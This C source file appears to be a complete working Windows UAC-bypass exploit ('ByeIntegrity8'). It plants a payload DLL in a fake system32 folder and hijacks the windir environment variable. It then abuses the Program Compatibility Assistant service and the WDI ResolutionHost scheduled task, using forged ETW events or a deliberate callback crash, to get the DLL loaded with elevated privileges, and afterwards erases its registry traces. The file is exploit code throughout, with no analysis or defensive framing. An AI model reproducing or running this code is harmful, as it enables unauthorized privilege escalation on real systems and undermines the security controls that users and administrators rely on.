#include <Windows.h>
#include <evntprov.h>
#include <taskschd.h>
#include <ShlObj.h>
#include <intrin.h>
#include <stdio.h>
#include "resource.h"
#define g_Instance ((HINSTANCE)&__ImageBase)

extern IMAGE_DOS_HEADER __ImageBase;

const VARIANT VARIANT_VAL = { {{VT_NULL, 0}} };
const GUID AE_LOG = { 0x0EEF54E71, 0x661, 0x422D, {0x9A, 0x98, 0x82, 0xFD, 0x49, 0x40, 0xB8, 0x20} };
const ULONG ZERO_VALUE = 0;
const EVENT_DATA_DESCRIPTOR AE_EVENT_DESCRIPTOR[3] = {
	{&ZERO_VALUE, sizeof(ULONG)},
	{&ZERO_VALUE, sizeof(ULONG)},
	{NULL, 0}
};

EVENT_DESCRIPTOR MessageBoxEvent = {
	0x1F46,
	0,
	0x11,
	0x4,
	0x0,
	0x0,
	0x4000000000000100
};

/* PcaMonitorProcess flags
* Names guessed from reverse-engineering & behavioral analysis
* NOCHAIN means don't use PCA chain; so don't resolve problems
* */
#define PCA_MONITOR_PROCESS_NORMAL 0
#define PCA_MONITOR_PROCESS_NOCHAIN 1
/* Program will be monitored for installer behavior
* If exe is elevated x86, it will be monitored as a
* legacy installer. DM dialog will show when exe
* terminates with abnormal exit code (other than 0). */
#define PCA_MONITOR_PROCESS_AS_INSTALLER 2

/* PcaMonitorProcess pointer prototype. Returns standard system error code
* PcaSvc needs to be running. It can be started by the INTERACTIVE users.
* This function will start it for us if it's stopped, so no need to worry about that
* Taken & names guessed from reverse-engineering & behavioral analysis */
typedef DWORD(WINAPI* PcaMonitorProcessPtr)(
	HANDLE hProcess, // handle to process to be monitored
	int unknown0, // always set to 1
	PWSTR exeFileName, // full path name to program executable file
	PWSTR cmdLine, // command line, usually exeName surrounded with quotes
	PWSTR workingDir, // working directory of program to be monitored, no trailing backslash
	ULONG flags // set of flags to modify monitoring behavior
);
/* Writes an event's information without registering its provider
   Definition taken from Geoff Chappell's website */
typedef ULONG(WINAPI* EtwEventWriteNoRegistrationPtr)(
	LPGUID providerId,
	PEVENT_DESCRIPTOR eventDescriptor,
	ULONG userDataCount,
	PEVENT_DATA_DESCRIPTOR userData
);

HRESULT BiStopWdiTask(
	BOOLEAN trace
)
{
	HRESULT hr;
	ITaskService* taskService;
	BSTR string;
	ITaskFolder* wdiFolder = NULL;
	IRegisteredTask* wdiTask = NULL;
	TASK_STATE taskState;

	hr = CoCreateInstance(&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
		&IID_ITaskService, &taskService);
	if (!SUCCEEDED(hr)) {
		if (trace)
			wprintf(L"CoCreateInstance() failed. HRESULT: %#010x\n", hr);
		goto eof;
	}

	hr = taskService->lpVtbl->Connect(taskService, VARIANT_VAL, VARIANT_VAL,
		VARIANT_VAL, VARIANT_VAL);
	if (!SUCCEEDED(hr)) {
		if (trace)
			wprintf(L"ITaskService::Connect() failed. HRESULT: %#010x\n", hr);
		goto eof;
	}

	string = SysAllocString(L"Microsoft\\Windows\\WDI");
	if (!string) {
		if (trace)
			_putws(L"SysAllocString() (0) failed. No memory");
		goto eof;
	}
	hr = taskService->lpVtbl->GetFolder(taskService, string, &wdiFolder);
	SysFreeString(string);
	if (!SUCCEEDED(hr)) {
		if (trace)
			wprintf(L"ITaskService::GetFolder() failed. HRESULT: %#010x\n", hr);
		goto eof;
	}

	string = SysAllocString(L"\\ResolutionHost");
	if (!string) {
		if (trace)
			_putws(L"SysAllocString() (1) failed. No memory");
		goto eof;
	}
	hr = wdiFolder->lpVtbl->GetTask(wdiFolder, string, &wdiTask);
	SysFreeString(string);
	if (!SUCCEEDED(hr)) {
		if (trace)
			wprintf(L"ITaskFolder::GetTask() failed. HRESULT: %#010x\n", hr);
		goto eof;
	}

	hr = wdiTask->lpVtbl->get_State(wdiTask, &taskState);
	if (!SUCCEEDED(hr)) {
		if (trace)
			wprintf(L"IRegisteredTask::get_State() failed. HRESULT: %#010x\n", hr);
		goto eof;
	}
	if (taskState == TASK_STATE_RUNNING) {
		hr = wdiTask->lpVtbl->Stop(wdiTask, 0);
		if (!SUCCEEDED(hr)) {
			if (trace)
				wprintf(L"IRegisteredTask::Stop() failed. HRESULT: %#010x\n", hr);
			goto eof;
		}
	}

eof:
	if (wdiTask)
		wdiTask->lpVtbl->Release(wdiTask);
	if (wdiFolder)
		wdiFolder->lpVtbl->Release(wdiFolder);
	if (taskService)
		taskService->lpVtbl->Release(taskService);
	return hr;
}

int BiTriggerMain(
	void
)
{
	ULONG win32Status;
	EtwEventWriteNoRegistrationPtr EtwEventWriteNoRegistration =
		(EtwEventWriteNoRegistrationPtr)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "EtwEventWriteNoRegistration");

	if (!EtwEventWriteNoRegistration)
		return EXIT_FAILURE;

	// write an event that PcaSvc will catch that indicates a version message box has been detected
	win32Status = EtwEventWriteNoRegistration(&AE_LOG, &MessageBoxEvent,
		3, &AE_EVENT_DESCRIPTOR);
	if (win32Status != ERROR_SUCCESS)
		return win32Status;

	MessageBoxEvent.Id = 0x1F48;
	// write an event that PcaSvc will catch that indicates a message box with an error icon has been detected
	win32Status = EtwEventWriteNoRegistration(&AE_LOG, &MessageBoxEvent,
		3, &AE_EVENT_DESCRIPTOR);

	return win32Status;
}

LRESULT CALLBACK BiWndClassTriggerProc(
	HWND hWnd,
	UINT msg,
	WPARAM wParam,
	LPARAM lParam
)
{
	if (msg == WM_WINDOWPOSCHANGING) {
		__ud2(); // cause an exception in a user callback. PcaSvc will detect this and attempt to launch the DM.
	}
	return DefWindowProcW(hWnd, msg, wParam, lParam);
}

int BiWndClassTriggerMain(
	void
)
{
	int exitCode;
	WNDCLASSEXW wc;
	ATOM classAtom;
	HWND window = NULL;

	SetErrorMode(SEM_NOGPFAULTERRORBOX);
	wc.cbSize = sizeof(WNDCLASSEXW);
	wc.lpszClassName = L"BiLegacyTriggerClass";
	wc.hInstance = g_Instance;
	wc.style = wc.cbClsExtra = wc.cbWndExtra = 0;
	wc.hIcon = wc.hIconSm = wc.lpszMenuName =
	wc.hbrBackground = wc.hCursor = NULL;
	wc.lpfnWndProc = BiWndClassTriggerProc;

	if (!(classAtom = RegisterClassExW(&wc))) {
		exitCode = (int)GetLastError();
		goto eof;
	}

	if (!(window = CreateWindowExW(0, MAKEINTATOM(classAtom), NULL,
		WS_OVERLAPPED, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
		HWND_DESKTOP, NULL, g_Instance, NULL))) {
		exitCode = (int)GetLastError();
		goto eof;
	}

	ShowWindow(window, SW_NORMAL);
	// program dies, won't need this...
	exitCode = 0;

eof:
	// same here...
	if (window)
		DestroyWindow(window);
	if (classAtom)
		UnregisterClassW(MAKEINTATOM(classAtom), g_Instance);
	return exitCode;
}

int wmain(
	int argc,
	PWCHAR* argv
)
{
	if (argv[0][0] == L'~')
		return BiTriggerMain();
	if (argv[0][0] == L'L')
		return BiWndClassTriggerMain();
	if (argv[0][0] == L'S') {
		HRESULT hr;
		HANDLE hSharedMemory;
		PUCHAR exeName = NULL;

		hSharedMemory = OpenFileMappingW(FILE_MAP_WRITE, FALSE, L"ByeIntegrity8");
		if (!hSharedMemory) {
			hr = HRESULT_FROM_WIN32(GetLastError());
			goto end;
		}

		exeName = MapViewOfFile(hSharedMemory, FILE_MAP_WRITE, 0, 0, 0);
		if (!exeName) {
			hr = HRESULT_FROM_WIN32(GetLastError());
			goto end;
		}
		
		hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE |
			COINIT_SPEED_OVER_MEMORY);
		if (!SUCCEEDED(hr))
			goto end;
		
		hr = BiStopWdiTask(FALSE);
		*(PBOOLEAN)(exeName + sizeof(BOOLEAN)) = TRUE;
		CoUninitialize();

end:
		if (exeName)
			UnmapViewOfFile(exeName);
		if (hSharedMemory)
			CloseHandle(hSharedMemory);
		return (int)hr;
	}

	int exitCode = EXIT_FAILURE;
	WCHAR cmdLine[2];
	PROCESS_INFORMATION processInfo = { NULL, NULL, 0 };
	STARTUPINFOW si;
	HRSRC resource;
	HGLOBAL loadedResource;
	LPVOID payload;
	HANDLE hPayload, hSharedMem = NULL;
	BOOLEAN createdSystemFake = FALSE, createdPayload = FALSE, comReady = FALSE;
	DWORD writtenBytes;
	HRESULT hr;
	HMODULE pcaModule = NULL;
	PcaMonitorProcessPtr PcaMonitorProcess = NULL; //fixme; 4703 without initialization for some reason...
	DWORD curDirSize;
	PWSTR curDir;
	LSTATUS status;
	BOOLEAN taskHijacked = FALSE, usesPca = TRUE;
	PUCHAR pSharedMem = NULL;
	WCHAR exeName[MAX_PATH];
	DWORD exeNameSize;

	if (*(PULONG)0x7FFE026C == 6 && *(PULONG)0x7FFE0270 == 1) {
		cmdLine[0] = L'L';
		cmdLine[1] = L'\0';
		usesPca = FALSE;
	}
	else {
		cmdLine[0] = L'~';
		cmdLine[1] = L'\0';
	}

	hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE | COINIT_SPEED_OVER_MEMORY);
	if (!SUCCEEDED(hr)) {
		wprintf(L"CoInitializeEx() failed. Error: %lu\n", GetLastError());
		goto eof;
	}

	resource = FindResourceW(g_Instance, MAKEINTRESOURCEW(IDR_PAYLOAD1), L"PAYLOAD");
	if (!resource) {
		wprintf(L"FindResourceW() failed. Error: %lu\n", GetLastError());
		goto eof;
	}
	loadedResource = LoadResource(g_Instance, resource);
	if (!loadedResource) {
		wprintf(L"LoadResource() failed. Error: %lu\n", GetLastError());
		goto eof;
	}
	payload = LockResource(loadedResource);
	if (!payload) {
		wprintf(L"LockResource() failed. Error: %lu\n", GetLastError());
		goto eof;
	}

	if (!CreateDirectoryW(L"system32", NULL)) {
		wprintf(L"CreateDirectoryW() failed. Error: %lu\n", GetLastError());
		goto eof;
	}
	createdSystemFake = TRUE;

	hPayload = CreateFileW(L"system32\\pcadm.dll", FILE_WRITE_ACCESS, FILE_SHARE_READ,
		NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hPayload == INVALID_HANDLE_VALUE) {
		wprintf(L"CreateFileW() failed. Error: %lu\n", GetLastError());
		goto eof;
	}
	createdPayload = TRUE;
	if (!WriteFile(hPayload, payload, SizeofResource(g_Instance, resource), &writtenBytes, NULL)) {
		CloseHandle(hPayload);
		wprintf(L"WriteFile() failed. Error: %lu\n", GetLastError());
		goto eof;
	}
	CloseHandle(hPayload);

	if (!SUCCEEDED(BiStopWdiTask(TRUE)))
		goto eof;

	if (usesPca) {
		pcaModule = LoadLibraryExW(L"pcacli.dll", NULL, LOAD_LIBRARY_SEARCH_SYSTEM32);
		if (!pcaModule) {
			wprintf(L"LoadLibraryExW() failed. Error: %lu\n", GetLastError());
			goto eof;
		}
		PcaMonitorProcess = (PcaMonitorProcessPtr)GetProcAddress(pcaModule, "PcaMonitorProcess");
		if (!PcaMonitorProcess) {
			wprintf(L"GetProcAddress() failed. Error: %lu\n", GetLastError());
			goto eof;
		}
	}
	else {
		BOOLEAN failed = TRUE;
		SC_HANDLE scHandle, hService = NULL;

		scHandle = OpenSCManagerW(NULL, SERVICES_ACTIVE_DATABASEW, SC_MANAGER_CONNECT);
		if (!scHandle) {
			wprintf(L"OpenSCManagerW() failed. Error: %lu\n", GetLastError());
			goto cleanup;
		}
		hService = OpenServiceW(scHandle, L"PcaSvc", SERVICE_START);
		if (!hService) {
			wprintf(L"OpenServiceW() failed. Error: %lu\n", GetLastError());
			goto cleanup;
		}
		if (!StartServiceW(hService, 0, NULL)) {
			wprintf(L"StartServiceW() failed. Error: %lu\n", GetLastError());
			goto cleanup;
		}

		failed = FALSE;

cleanup:
		if (hService)
			CloseServiceHandle(hService);
		if (scHandle)
			CloseServiceHandle(scHandle);
		if (failed)
			goto eof;
	}

	exeNameSize = MAX_PATH;
	if (!QueryFullProcessImageNameW(GetCurrentProcess(), 0, exeName, &exeNameSize)) {
		wprintf(L"QueryFullProcessImageNameW() failed. Error: %lu\n", GetLastError());
		goto eof;
	}

	curDirSize = GetCurrentDirectoryW(0, NULL);
	curDir = HeapAlloc(GetProcessHeap(), 0, curDirSize * sizeof(WCHAR));
	if (!GetCurrentDirectoryW(curDirSize, curDir)) {
		HeapFree(GetProcessHeap(), 0, curDir);
		wprintf(L"GetCurrentDirectoryW() failed. Error: %lu\n", GetLastError());
		goto eof;
	}

	hSharedMem = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE,
		0, ((exeNameSize + 1) * sizeof(WCHAR)) + (sizeof(BOOLEAN) * 2), L"ByeIntegrity8");
	if (!hSharedMem) {
		HeapFree(GetProcessHeap(), 0, curDir);
		wprintf(L"CreateFileMappingW() failed. Error: %lu\n", GetLastError());
		goto eof;
	}

	pSharedMem = MapViewOfFile(hSharedMem, FILE_MAP_WRITE, 0, 0, 0);
	if (!pSharedMem) {
		HeapFree(GetProcessHeap(), 0, curDir);
		wprintf(L"MapViewOfFile() failed. Error: %lu\n", GetLastError());
		goto eof;
	}
	memcpy(pSharedMem + (sizeof(BOOLEAN) * 2), exeName, (exeNameSize + 1) * sizeof(WCHAR));

	status = RegSetKeyValueW(HKEY_CURRENT_USER, L"Environment", L"windir", REG_SZ, curDir,
		curDirSize * sizeof(WCHAR));
	if (status) {
		HeapFree(GetProcessHeap(), 0, curDir);
		wprintf(L"RegSetKeyValueW() failed. LSTATUS: %lu\n", status);
		goto eof;
	}

	ZeroMemory(&si, sizeof(STARTUPINFOW));
	si.cb = sizeof(STARTUPINFOW);
	status = (LSTATUS)CreateProcessW(exeName, cmdLine, NULL, NULL, FALSE, CREATE_SUSPENDED,
		NULL, NULL, &si, &processInfo);
	if (!status) {
		RegDeleteKeyValueW(HKEY_CURRENT_USER, L"Environment", L"windir");
		HeapFree(GetProcessHeap(), 0, curDir);
		wprintf(L"CreateProcessW() failed. Error: %lu\n", GetLastError());
		goto eof;
	}

	if (usesPca)
		status = (LSTATUS)PcaMonitorProcess(processInfo.hProcess, 1, exeName, cmdLine,
			curDir, PCA_MONITOR_PROCESS_NORMAL);
	else
		status = 0;
	HeapFree(GetProcessHeap(), 0, curDir);
	if (status) {
		TerminateProcess(processInfo.hProcess, 0);
		RegDeleteKeyValueW(HKEY_CURRENT_USER, L"Environment", L"windir");
		wprintf(L"PcaMonitorProcess() failed. Error: %lu\n", (DWORD)status);
		goto eof;
	}
	ResumeThread(processInfo.hThread);

	WaitForSingleObject(processInfo.hProcess, INFINITE);
	if (usesPca) {
		GetExitCodeProcess(processInfo.hProcess, &curDirSize);
		if (curDirSize) {
			wprintf(L"Trigger process exited with error code: %lu\n", curDirSize);
			goto eofEarly;
		}
	}

	for (int i = 0; i <= 2000; ++i) {
		if (*(PBOOLEAN)pSharedMem == TRUE) {
			taskHijacked = TRUE;
			break;
		}
		Sleep(10);
	}
	if (!taskHijacked)
		wprintf(L"Diagnostic module task did not launch & exit properly. HRESULT: %#010x\n", hr);

eofEarly:
	RegDeleteKeyValueW(HKEY_CURRENT_USER, L"Environment", L"windir");
	if (!usesPca) {
		RegDeleteKeyValueW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers",
			exeName);
		RegDeleteKeyValueW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Persisted",
			exeName);
	}
	else
		RegDeleteKeyValueW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store",
			exeName);

	if (taskHijacked) {
		_putws(L"[$] Exploit successful\n");
		exitCode = 0;
	}
	for (int i = 0; i <= 2000; ++i) {
		if (*(PBOOLEAN)(pSharedMem + sizeof(BOOLEAN)) == TRUE) {
			break;
		}
		Sleep(10);
	}

eof:
	if (processInfo.hThread)
		CloseHandle(processInfo.hThread);
	if (processInfo.hProcess)
		CloseHandle(processInfo.hProcess);
	if (pSharedMem)
		UnmapViewOfFile(pSharedMem);
	if (hSharedMem)
		CloseHandle(hSharedMem);
	if (pcaModule)
		FreeLibrary(pcaModule);
	if (comReady)
		CoUninitialize();
	if (createdPayload)
		DeleteFileW(L"system32\\pcadm.dll");
	if (createdSystemFake)
		RemoveDirectoryW(L"system32");
	return exitCode;
}
